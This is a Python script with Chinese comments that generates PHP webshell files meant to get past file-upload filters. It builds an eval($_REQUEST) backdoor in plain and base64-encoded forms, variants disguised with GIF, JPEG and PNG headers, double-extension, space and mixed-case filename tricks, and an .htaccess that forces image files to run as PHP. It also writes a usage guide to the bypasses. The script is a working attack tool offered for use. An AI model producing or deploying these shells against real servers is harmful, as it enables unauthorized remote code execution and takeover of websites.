import os
import base64

# 原始 PHP WebShell
RAW_SHELL = b"""<?php eval($_REQUEST[1]);?>
"""

# 配置项
OUTPUT_DIR = "bypass_files"
EXTENSIONS = ["php", "phtml", "php5", "phar"]
IMAGE_HEADERS = {
    "gif": b"GIF89a<?php ",
    "jpg": base64.b64decode("/9j/4AAQSkZJRgAB") + b"<?php ",
    "png": base64.b64decode("iVBORw0KGgo=") + b"<?php "
}

def create_directory():
    """创建输出目录"""
    os.makedirs(OUTPUT_DIR, exist_ok=True)

def save_file(filename, content):
    """通用写入文件函数"""
    with open(os.path.join(OUTPUT_DIR, filename), "wb") as f:
        f.write(content)

def encode_shell(shell_code):
    """生成 Base64 编码版本"""
    encoded = base64.b64encode(shell_code).decode()
    return f"<?php eval(base64_decode('{encoded}')); ?>".encode()

def generate_variants(shell_code):
    """生成普通 WebShell 变种"""
    for ext in EXTENSIONS:
        save_file(f"shell.{ext}", shell_code)
    save_file("shell_encoded.php", encode_shell(shell_code))

def generate_image_shells(shell_code):
    """生成伪装成图片的 WebShell"""
    for ext, header in IMAGE_HEADERS.items():
        save_file(f"shell.{ext}", header + shell_code[5:])  # 去掉 <?php

def generate_htaccess():
    """生成 .htaccess 规则"""
    htaccess_content = """<FilesMatch "\.(php|phtml|php5|phar|gif|jpg|png)$">
    SetHandler application/x-httpd-php
</FilesMatch>
Options +ExecCGI
AddType application/x-httpd-php .php .phtml .php5 .phar .jpg .gif .png
"""
    save_file(".htaccess", htaccess_content.encode())

def generate_case_bypass():
    """生成大小写绕过的 WebShell"""
    save_file("SheLL.pHp", RAW_SHELL)

def generate_bypass_variants():
    """生成更多 WebShell 绕过方式"""
    bypass_files = {
        "shell.php.jpg": RAW_SHELL,       # 双扩展绕过
        "shell.phtml.gif": RAW_SHELL,     # 伪造扩展名
        "shell .php": RAW_SHELL,          # 空格绕过

    }
    for filename, content in bypass_files.items():
        save_file(filename, content)

def generate_usage():
    """生成使用指南"""
    usage_text = """# WebShell 绕过指南 

## 1. 生成的文件
### WebShell 变种
- `shell.[php|phtml|php5|phar]` - 普通版本
- `shell_encoded.php` - Base64 编码版本
- `SheLL.pHp` - 大小写绕过

### 伪装图片 WebShell
- `shell.[gif|jpg|png]` - 带图片头部的 Shell

### 额外绕过方式
- `shell.php.jpg` - 双扩展绕过
- `shell.phtml.gif` - 伪造扩展绕过
- `shell .php` - 空格绕过


### `.htaccess` 规则
- **解析图片后缀**（jpg, gif, png）为 PHP
- **允许 PHP 解析** `.phtml`, `.php5`, `.phar`
- **启用 CGI 执行**

## 2. 绕过方式
- **扩展名绕过**：`shell.php.jpg`
- **图片伪装**：上传 `shell.jpg`，检查是否解析 PHP
- **空格绕过**：尝试 `shell .php`
- **`.htaccess` 配置**：上传 `.htaccess`，强制解析某些文件
"""
    save_file("usage.md", usage_text.encode())

def main():
    create_directory()
    generate_variants(RAW_SHELL)
    generate_image_shells(RAW_SHELL)
    generate_htaccess()
    generate_case_bypass()
    generate_bypass_variants()
    generate_usage()
    print(f"文件生成完成，请查看 {OUTPUT_DIR} 目录。")

if __name__ == "__main__":
    main()
